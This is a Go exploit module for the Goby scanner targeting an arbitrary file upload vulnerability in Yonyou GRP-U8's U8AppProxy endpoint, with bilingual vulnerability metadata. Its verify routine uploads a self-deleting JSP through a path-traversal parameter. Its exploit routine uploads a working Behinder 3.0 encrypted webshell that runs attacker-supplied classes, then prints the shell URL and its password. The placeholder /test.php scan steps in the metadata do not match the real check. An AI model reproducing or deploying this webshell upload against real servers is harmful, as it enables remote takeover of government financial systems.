package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "yongyou GRP-U8 U8AppProxy Arbitrary file upload vulnerability",
    "Description": "<p>Yonyou GRP-U8 management software is a new generation of products launched by UFIDA focusing on national e-government affairs and based on cloud computing technology. It is the most professional government financial management software in the field of administrative affairs and finance in my country.</p><p>UFIDA GRP-U8 management software U8AppProxy has an arbitrary file upload vulnerability, an attacker can upload a webshell to obtain server permissions.</p>",
    "Product": "yonyou-GRP-U8",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-01-17",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"window.location.replace(\\\"login.jsp?up=1\\\")\" || body=\"GRP-U8\"",
    "GobyQuery": "body=\"window.location.replace(\\\"login.jsp?up=1\\\")\" || body=\"GRP-U8\"",
    "Level": "2",
    "Impact": "<p>UFIDA GRP-U8 management software U8AppProxy has an arbitrary file upload vulnerability, an attacker can upload a webshell to obtain server permissions.</p>",
    "Recommendation": "<p>At present, the manufacturer has released security patches, please pay attention to the official website for updates: <a href=\"https://www.yonyou.com/.\">https://www.yonyou.com/.</a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/hYPdNN6skbikC3FFYRlbrQ"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "Behinder3.0"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "用友GRP-U8 软件 U8AppProxy 任意文件上传漏洞",
            "Product": "用友-GRP-U8",
            "Description": "<p>用友GRP-U8管理软件是用友公司专注于国家电子政务事业,基于云计算技术所推出的新一代产品,是我国行政事业财务领域最专业的政府财务管理软件。<br></p><p>用友GRP-U8管理软件 U8AppProxy 存在任意文件上传漏洞，攻击者可上传webshell获取服务器权限。<br></p>",
            "Recommendation": "<p>目前厂商已发布安全补丁，请及时关注官网更新：<a href=\"https://www.yonyou.com/\">https://www.yonyou.com/</a>。<br></p>",
            "Impact": "<p>用友GRP-U8管理软件 U8AppProxy 存在任意文件上传漏洞，攻击者可上传webshell获取服务器权限。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "yongyou GRP-U8 U8AppProxy Arbitrary file upload vulnerability",
            "Product": "yonyou-GRP-U8",
            "Description": "<p>Yonyou GRP-U8 management software is a new generation of products launched by UFIDA focusing on national e-government affairs and based on cloud computing technology. It is the most professional government financial management software in the field of administrative affairs and finance in my country.<br></p><p>UFIDA GRP-U8 management software U8AppProxy has an arbitrary file upload vulnerability, an attacker can upload a webshell to obtain server permissions.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released security patches, please pay attention to the official website for updates: <a href=\"https://www.yonyou.com/.\">https://www.yonyou.com/.</a><br></p>",
            "Impact": "<p>UFIDA GRP-U8 management software U8AppProxy has an arbitrary file upload vulnerability, an attacker can upload a webshell to obtain server permissions.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10791"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randName := goutils.RandomHexString(6)
			uri := "/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../" + randName
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryW0vdr4bjEUTVj3Sw")
			cfg.Data = "------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"file\";filename=\"1.jsp\"\r\nContent-Type: image/png\r\n\r\n<%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer(\"ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=\")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw--\r\n"
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				uri2 := fmt.Sprintf("/%s.jsp", randName)
				cfg2 := httpclient.NewGetRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "e165421110ba03099a1c0393373c5b43")

				}
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randName := goutils.RandomHexString(6)
			uri := "/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../" + randName
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryW0vdr4bjEUTVj3Sw")
			cfg.Data = "------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"file\";filename=\"1.jsp\"\r\nContent-Type: image/png\r\n\r\n<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw--\r\n"
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				uri2 := fmt.Sprintf("/%s.jsp", randName)
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + uri2 + "\n"
        expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0"
				expResult.Success = true
			}
			return expResult
		},
	))
}